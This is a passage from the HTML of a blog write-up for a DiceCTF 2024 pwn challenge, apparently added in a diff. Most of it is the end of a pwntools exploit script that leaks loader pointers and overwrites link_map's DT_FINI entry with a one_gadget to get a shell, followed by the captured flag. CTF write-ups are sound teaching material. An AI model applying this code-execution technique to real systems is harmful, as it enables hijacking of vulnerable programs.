+</span></span><span class="line"><span class="cl">  <span class="n">leaked_dt_fini</span> <span class="o">=</span> <span class="n">leaked_dt_fini</span> <span class="o">|</span> <span class="p">(</span> <span class="n">u8</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">clap</span><span class="p">(</span><span class="n">dt_fini_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_dt_fini</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set one_gadget in link_map-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_offset</span> <span class="o">=</span> <span class="n">leaked_dt_fini</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">target_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">target_offset</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Set higher 3 bytes, taken from one of the values stored in libc rw area</span>
+</span></span><span class="line"><span class="cl"><span class="n">from_offset</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21b518</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">from_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">target_offset</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;partial&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Set 1st byte</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_offset</span> <span class="o">=</span> <span class="n">leaked_dt_fini</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">clap</span><span class="p">(</span><span class="n">ld_base</span><span class="o">-</span><span class="mh">0x15f8</span> <span class="o">-</span> <span class="n">base_offset</span><span class="p">,</span> <span class="n">target_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;1st byte&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Set 2nd byte</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_offset</span> <span class="o">=</span> <span class="n">leaked_dt_fini</span><span class="o">+</span><span class="mh">0x8</span><span class="o">+</span><span class="mi">1</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">clap</span><span class="p">(</span><span class="n">ld_base</span><span class="o">+</span><span class="mh">0x3b091</span> <span class="o">-</span> <span class="n">base_offset</span><span class="p">,</span> <span class="n">target_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;2nd byte&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Search 3rd byte</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;searching last byte&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">last</span> <span class="o">=</span> <span class="p">(</span><span class="n">one_gadget</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">last</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">ld_base</span><span class="o">+</span><span class="mh">0x3a000</span>
+</span></span><span class="line"><span class="cl"><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">correct_offset</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">map_offset</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">key</span> <span class="o">-</span> <span class="n">base_offset</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;soul!&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">temp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x1b</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">=</span> <span class="n">temp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">key</span> <span class="o">-</span> <span class="n">base_offset</span> <span class="p">,</span> <span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;count = &#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">count</span><span class="p">),</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="si">= }</span><span class="s1">, </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">last</span><span class="p">)</span> <span class="si">= }</span><span class="s1">, </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">val</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">val</span> <span class="o">==</span> <span class="n">last</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">correct_offset</span> <span class="o">=</span> <span class="n">offset</span><span class="o">+</span><span class="n">key</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Set 3rd byte</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_offset</span> <span class="o">=</span> <span class="n">leaked_dt_fini</span><span class="o">+</span><span class="mh">0xa</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">clap</span><span class="p">(</span><span class="n">correct_offset</span> <span class="o">-</span> <span class="n">base_offset</span><span class="p">,</span> <span class="n">target_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;3rd byte&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Just to validate that our write is success</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_offset</span> <span class="o">=</span> <span class="n">leaked_dt_fini</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">test_valzz</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">target_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;soul!&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_valzz</span> <span class="o">=</span> <span class="n">test_valzz</span> <span class="o">|</span> <span class="p">(</span> <span class="n">u8</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">target_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">test_valzz</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">clap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="https://i.imgur.com/QVmseRS.png"/>
+<blockquote>
+<p><strong>Flag: dice{i7_S33MS_sOm3BODY_cOOK3D_h3r3_8ff4c343}</strong></p>
+</blockquote>
+<h1 id="social-media">Social Media</h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/dicectf-2024-quals/" data-title="DiceCTF 2024 Quals" data-via="Chovid99" data-hashtags="Writeup,pwn,heap,javascript,serenity,2024"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/dicectf-2024-quals/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/heap/">heap</a>,&nbsp;<a href="/tags/javascript/">javascript</a>,&nbsp;<a href="/tags/serenity/">serenity</a>,&nbsp;<a href="/tags/2024/">2024</a></section>
+        <section>
+            
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/real-world-ctf-2024/" class="prev" rel="prev" title="Real World CTF 2024"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Real World CTF 2024</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
+</html>
